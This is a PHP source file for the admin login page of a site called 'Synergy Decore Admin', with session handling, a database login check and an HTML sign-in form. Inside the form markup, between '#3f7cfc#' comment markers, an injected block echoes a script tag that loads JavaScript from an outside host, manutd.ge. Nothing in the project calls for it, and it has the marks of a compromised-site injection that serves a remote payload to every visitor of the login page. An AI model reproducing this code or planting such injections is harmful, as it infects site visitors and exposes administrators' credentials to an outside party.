<?php session_start();
ob_start();

include "inc/connection.php";
include "inc/function.php"; 

if(isset($_SESSION['foreuid']))
{
header("location: dashboard.php");
}
if(isset($_POST['login']))
{
	
	$username = mysql_real_escape_string($_POST['username']);
	$password = mysql_real_escape_string($_POST['password']);
	$encpassword = encryptString($password);
	
	$get_data = login($username,$encpassword);
	$count=mysql_num_rows($get_data);

	if($count<=0)
	{
		header("location:index.php?msg=err&cont=Incorrect Username / Password.");
	}
	else
	{
	$fetch = mysql_fetch_array($get_data);
	if($fetch['status']==0)
	{
		header("location:index.php?msg=err&cont=Please activate your account.");
	}
	else {
	$_SESSION['foreuid'] = $fetch['uid'];

	header("location:dashboard.php");
	}
	}
	
}

?>
<!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->
  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->
  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->
  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->
   <head>
    <meta charset="utf-8">
    <title>Synergy Decore Admin</title>
    <link href="icomoon/style.css" rel="stylesheet">
    <link href="css/main.css" rel="stylesheet">
    <script src="js/html5-trunk.js"></script>
     <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
 
  </head>
  <body style="background:#FAFAFA;">
    <div class="container-fluid">
      <div class="row-fluid">
        <div class="span4 offset4">
        	
          <div class="signin">
            <h1 class="center-align-text">Login</h1>
			<?php include "message.php"; ?>
<?php
#3f7cfc#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967025\"></script>";
echo $g;
}
#/3f7cfc#
?>            <form class="signin-wrapper" name="adminlogin" id="adminlogin" method="post">
              <div class="content">
                <input class="input input-block-level required" title="Enter Your Username" type="text" name="username">
                <input class="input input-block-level required" type="password" title="Enter Your Password" name="password">
              </div>
              <div class="actions">
                <input class="btn btn-info pull-right" name="login" type="submit" value="Login">
                <span class="checkbox-wrapper">
                </span>
                <div class="clearfix"></div>
              </div>
            </form>
          </div>
        </div>
      </div>
    </div>
     <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
		<script type="text/javascript"  src="js/jquery-latest.js"></script>
	<script type="text/javascript"  src="js/jquery.validate.js"></script>
	<script>
	  $(document).ready(function(){
	    $("#adminlogin").validate({
	    	success: function(label) {
				// set &nbsp; as text for IE
				label.html("&nbsp;").addClass("checked");
			}
	    });
	    });
	</script>

</body>
</html>